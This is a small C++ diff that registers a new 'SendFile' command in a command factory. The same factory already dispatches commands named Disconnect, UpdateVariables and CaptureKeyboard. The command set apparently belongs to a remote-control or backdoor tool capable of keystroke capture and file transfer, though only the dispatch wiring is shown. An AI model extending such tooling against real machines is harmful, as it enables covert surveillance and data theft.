@@ -18,6 +18,7 @@
 #include "BD_CP_Disconnect.h"
 #include "BD_CP_UpdateVariables.h"
 #include "BD_CP_CaptureKeyboard.h"
+#include "BD_CP_SendFile.h"
 
 class BDCommand *BuildCommandFromData( unsigned long dwType )
 {
@@ -57,6 +58,9 @@ class BDCommand *BuildCommandFromData( unsigned long dwType )
 		return new BD_CP_UpdateVariables();
 	case BD_CP_CAPTURE_KEYBOARD:
 		return new BD_CP_CaptureKeyboard();
+	case BD_CP_SEND_FILE:
+		return new BD_CP_SendFile();
+
 	default:
 		// Log Error
 		return NULL;
